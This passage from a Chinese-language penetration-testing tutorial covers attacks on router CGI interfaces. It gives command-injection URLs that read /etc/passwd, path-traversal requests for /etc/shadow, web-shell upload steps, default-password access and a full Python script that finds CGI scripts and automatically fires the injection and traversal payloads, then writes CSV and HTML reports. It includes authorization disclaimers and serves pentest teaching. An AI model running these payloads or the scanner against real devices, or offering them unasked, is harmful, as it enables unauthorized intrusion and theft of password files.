构造请求：

```
http://192.168.1.1/cgi-bin/ping.cgi?host=192.168.1.100;cat%20/etc/passwd
```

如果 CGI 没有过滤分号或特殊字符，系统就会执行 `ping -c 4 192.168.1.100` **并且** 执行 `cat /etc/passwd`。

------

### (2) 文件上传或本地文件读取

很多路由器管理界面允许通过 CGI 上传配置文件或固件，如果上传模块存在漏洞：

- 可以上传恶意文件，例如 **一句话木马** 或 **Shell 脚本**。
- 访问后可获得远程控制权限。

**示例：**

```
http://192.168.1.1/cgi-bin/upload.cgi
```

上传 `shell.php` 或 `cmd.sh` 后，访问：

```
http://192.168.1.1/uploads/cmd.sh
```

即可执行命令。

------

### (3) 路径遍历

某些 CGI 脚本允许读取任意文件路径，如果没有严格限制：

```
http://192.168.1.1/cgi-bin/download.cgi?file=../../etc/shadow
```

可能直接泄露密码文件内容。

------

### (4) 参数滥用 / 默认密码

- 一些 CGI 脚本可能暴露管理接口，例如 `/cgi-bin/admin.cgi`。
- 如果没有认证或使用默认密码，就可能直接控制设备。

------

## 4. 漏洞扫描和利用流程示例

**假设目标是嵌入式路由器，IP 为 192.168.1.1：**

1. **枚举 CGI 脚本**

```
# 使用 dirb 或 gobuster 枚举 /cgi-bin/
gobuster dir -u http://192.168.1.1/ -w cgi.txt -x cgi,sh,pl
```

1. **测试命令注入**

```
# 尝试常见 payload
http://192.168.1.1/cgi-bin/ping.cgi?host=127.0.0.1;id
```

1. **尝试路径遍历**

```
http://192.168.1.1/cgi-bin/download.cgi?file=../../etc/passwd
```

1. **尝试上传后门**

- 上传 `cmd.sh`
- 访问 `/uploads/cmd.sh?cmd=id`

1. **获取 Shell / 提权**

- 如果 CGI 运行 root，直接获取 root Shell
- 否则结合本地提权漏洞进一步升级权限

------

## 5. 小结

| 分类     | 漏洞类型           | 示例                                      |
| -------- | ------------------ | ----------------------------------------- |
| 命令执行 | command injection  | `ping.cgi?host=127.0.0.1;cat /etc/passwd` |
| 文件操作 | 文件上传/读取      | `upload.cgi` 上传 Shell                   |
| 路径遍历 | 文件读取           | `download.cgi?file=../../etc/shadow`      |
| 管理接口 | 默认密码或参数滥用 | `admin.cgi?user=admin&pass=admin`         |

**注意事项：**

- IoT 设备的 CGI 漏洞利用通常结合 **固件分析** 来发现未公开接口。
- 在渗透测试中，需要注意合法授权，否则属于非法攻击。

- 扫描 `/cgi-bin/` 下的 CGI 文件（使用你提供或预设的列表）
- 对可访问的 CGI 执行 **命令注入测试** 与 **路径遍历测试**
- 生成两份报告：**CSV**（概要）和 **交互式 HTML**（每个 Payload 可点击展开查看完整响应）
- HTML 用简洁的 JavaScript 实现展开/收起和高亮，方便离线查看

> **重要**：仅在你有授权的实验环境中运行此脚本。对未授权目标进行测试是非法的。

把下面代码保存为 `cgi_report_interactive.py`，修改 `TARGET` 与 `CGI_LIST` 后运行：`python3 cgi_report_interactive.py`

```Python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CGI 批量扫描 + 漏洞测试 + CSV + 交互式 HTML 报告
- 每个测试项在 HTML 报告中可展开查看完整响应
- 使用 html.escape() 对响应进行转义，防止 HTML 注入

仅用于实验或获授权目标测试
"""

import requests
from urllib.parse import quote
import csv
import os
import datetime
import html

# -----------------------------
# 配置区（请修改为你的实验目标/列表）
# -----------------------------
TARGET = "http://192.168.1.1"
CGI_LIST = [
    "ping.cgi",
    "download.cgi",
    "diag.cgi",
    "status.cgi",
    "config.cgi",
    "test.cgi",
    # 如果你想自动枚举，可以把更多常见名称放在这里
]

# payloads
CMD_INJECTION_PAYLOAD = "127.0.0.1;id"  # 示例 payload（注入 id）
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../etc/shadow",
    "../../proc/cpuinfo"
]

TIMEOUT = 6  # 请求超时（秒）
CSV_REPORT_FILE = "cgi_scan_report.csv"
HTML_REPORT_FILE = "cgi_scan_report_interactive.html"

# -----------------------------
# 实用函数
# -----------------------------
def safe_get(url):
    """简单封装 requests.get，返回 (status_code, text) 或 (None, errstr)"""
    try:
        r = requests.get(url, timeout=TIMEOUT)
        return r.status_code, r.text
    except Exception as e:
        return None, f"REQUEST_ERROR: {e}"

# -----------------------------
# 扫描 CGI 列表，返回存在的文件名列表
# -----------------------------
def scan_cgi():
    available = []
    print("[*] 扫描 CGI 文件存在性...")
    for cgi in CGI_LIST:
        url = f"{TARGET}/cgi-bin/{cgi}"
        code, text = safe_get(url)
        if code == 200:
            print(f"[+] {cgi} 存在 (200)")
            available.append(cgi)
        else:
            print(f"[-] {cgi} 不可访问 (code={code})")
    return available

# -----------------------------
# 执行测试并收集数据结构
# -----------------------------
def run_tests(cgi_files):
    """
    返回 results: list of dicts:
    {
      'cgi': str,
      'vuln': '命令注入'|'路径遍历',
      'payload': str,
      'status': int or None,
      'summary': str (first N chars),
      'full': str (full response or error)
    }
    """
    results = []
    print("[*] 运行测试...")
    for cgi in cgi_files:
        # 命令注入（host 参数示例）
        url_cmd = f"{TARGET}/cgi-bin/{cgi}?host={quote(CMD_INJECTION_PAYLOAD)}"
        code, text = safe_get(url_cmd)
        summary = text[:500] if text and isinstance(text, str) else ""
        results.append({
            'cgi': cgi,
            'vuln': '命令注入',
            'payload': CMD_INJECTION_PAYLOAD,
            'status': code,
            'summary': summary,
            'full': text if text is not None else ""
        })
        # 路径遍历（file 参数示例）
        for p in PATH_TRAVERSAL_PAYLOADS:
            url_pt = f"{TARGET}/cgi-bin/{cgi}?file={quote(p)}"
            code2, text2 = safe_get(url_pt)
            summary2 = (text2[:500] if text2 and isinstance(text2, str) else
                        (f"状态码:{code2}" if code2 is not None else text2))
            results.append({
                'cgi': cgi,
                'vuln': '路径遍历',
                'payload': p,
                'status': code2,
                'summary': summary2,
                'full': text2 if text2 is not None else ""
            })
    return results

# -----------------------------
# 写 CSV（概要）
# -----------------------------
def write_csv(results, csvpath):
    with open(csvpath, mode='w', newline='', encoding='utf-8') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["CGI 文件", "漏洞类型", "Payload", "HTTP 状态", "响应摘要（前500字符）"])
        for r in results:
            writer.writerow([r['cgi'], r['vuln'], r['payload'], r['status'], r['summary']])
    print(f"[*] CSV 报告已写：{os.path.abspath(csvpath)}")

# -----------------------------
# 生成交互式 HTML 报告
# -----------------------------
def generate_interactive_html(results, htmlpath):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # 将结果按 cgi 分组，便于展示
    grouped = {}
    for idx, r in enumerate(results):
        grouped.setdefault(r['cgi'], []).append((idx, r))

    # HTML header with simple styles and JS for toggle/search
    html_parts = []
    html_parts.append(f"""<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>CGI 扫描交互式报告</title>
<style>
body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#f7f9fb; color:#222; padding:20px; }}
.container {{ max-width:1100px; margin:0 auto; }}
.header {{ display:flex; justify-content:space-between; align-items:center; gap:10px; }}
.card {{ background:#fff; border-radius:8px; padding:12px; box-shadow:0 1px 4px rgba(0,0,0,0.08); margin:12px 0; }}
.card h2 {{ margin:0 0 8px; font-size:18px; }}
.small {{ color:#666; font-size:13px; }}
.payload {{ background:#f0f4f8; padding:6px 8px; border-radius:6px; display:inline-block; font-family:monospace; }}
.togglebtn {{ cursor:pointer; color:#1a73e8; text-decoration:underline; border:none; background:none; padding:0; }}
pre.response {{ background:#0f1720; color:#d6f8ff; padding:12px; border-radius:6px; overflow:auto; max-height:320px; white-space:pre-wrap; }}
.searchbox {{ margin: 12px 0; }}
.badge {{ display:inline-block; padding:4px 8px; border-radius:12px; background:#eee; margin-right:6px; font-size:12px; }}
.status-ok {{ background:#e6ffed; border:1px solid #b7f2c6; color:#006b2f; padding:4px 8px; border-radius:6px; }}
.status-err {{ background:#fff5f5; border:1px solid #f1c0c0; color:#7a0606; padding:4px 8px; border-radius:6px; }}
</style>
</head>
<body>
<div class="container">
<div class="header">
  <div>
    <h1>CGI 扫描交互式报告</h1>
    <div class="small">生成时间: {now} &nbsp; &nbsp; 目标: {html.escape(TARGET)}</div>
  </div>
  <div>
    <button onclick="expandAll()">全部展开</button>
    <button onclick="collapseAll()">全部收起</button>
  </div>
</div>

<div class="searchbox">
  <label>搜索 CGI / Payload / 类型: <input id="q" type="text" oninput="filterCards()" style="width:420px;padding:6px;border-radius:6px;border:1px solid #ccc;"></label>
</div>
""")

    # Cards per CGI
    for cgi, items in grouped.items():
        html_parts.append(f'<div class="card" id="card-{html.escape(cgi)}">')
        html_parts.append(f'<h2>{html.escape(cgi)}</h2>')
        html_parts.append(f'<div class="small">测试项: {len(items)} &nbsp; | &nbsp; 路径: /cgi-bin/{html.escape(cgi)}</div>')
        # list each test entry
        for idx, entry in items:
            r = entry
            status = r['status']
            status_html = f'<span class="status-ok">HTTP {status}</span>' if status and 200 <= status < 300 else f'<span class="status-err">HTTP {status}</span>'
            payload_html = html.escape(r['payload'])
            vuln_html = html.escape(r['vuln'])
            summary_html = html.escape(r['summary'] or "(无响应或错误)")
            full_html = html.escape(r['full'] or "(无响应或错误)")
            # toggler + hidden pre
            html_parts.append(f'''
<div style="margin-top:10px;padding:8px;border-radius:6px;border:1px dashed #e6eef6;">
  <div>
    <span class="badge">{vuln_html}</span>
    <span class="payload">{payload_html}</span>
    &nbsp;&nbsp;{status_html}
    &nbsp;&nbsp;<button class="togglebtn" onclick="toggleResponse('resp-{idx}')">查看/收起 完整响应</button>
  </div>
  <div style="margin-top:8px;"><b>摘要:</b> <span class="small">{summary_html}</span></div>
  <div id="resp-{idx}" style="display:none; margin-top:10px;">
    <pre class="response">{full_html}</pre>
  </div>
</div>
''')
        html_parts.append('</div>')  # end card

    # JS functions for toggling and filtering
    html_parts.append('''
<script>
function toggleResponse(id) {
  var el = document.getElementById(id);
  if (!el) return;
  el.style.display = (el.style.display === 'none' ? 'block' : 'none');
}
function expandAll() {
  var pres = document.querySelectorAll('[id^="resp-"]');
  pres.forEach(function(p){ p.style.display = 'block'; });
}
function collapseAll() {
  var pres = document.querySelectorAll('[id^="resp-"]');
  pres.forEach(function(p){ p.style.display = 'none'; });
}
function filterCards() {
  var q = document.getElementById('q').value.toLowerCase();
  var cards = document.querySelectorAll('.card');
  cards.forEach(function(card){
    var text = card.innerText.toLowerCase();
    if (text.indexOf(q) !== -1) { card.style.display = ''; }
    else { card.style.display = 'none'; }
  });
}
</script>
''')

    html_parts.append("""
</div>
</body>
</html>
""")

    # write to file
    with open(htmlpath, "w", encoding="utf-8") as fh:
        fh.write("".join(html_parts))
    print(f"[*] HTML 报告已写：{os.path.abspath(htmlpath)}")

# -----------------------------
# 主流程
# -----------------------------
def main():
    print("[*] CGI 扫描与测试（仅限授权目标）")
    available = scan_cgi()
    if not available:
        print("[!] 未发现可访问 CGI，退出。")
        return
    results = run_tests(available)
    write_csv(results, CSV_REPORT_FILE)
    generate_interactive_html(results, HTML_REPORT_FILE)
    print("[*] 完成。请打开 HTML 报告查看详细信息。")

if __name__ == "__main__":
    main()
```

### 使用建议与注意

- 把 `TARGET` 改为你的实验设备 IP（或域名），并按需扩展 `CGI_LIST`。
- HTML 报告会把每个测试结果的完整响应以文本形式写入页面（已做 HTML 转义以避免脚本注入）。
- 如果响应非常大（例如二进制文件或数 MB），你可能希望在 `run_tests` 中对 `text` 做大小限制（示例中保留完整响应，但 HTML 显示会有限制的最大高度）。
- 报告包含 `搜索` 框，支持按 CGI 名称、Payload 或响应内容关键字过滤。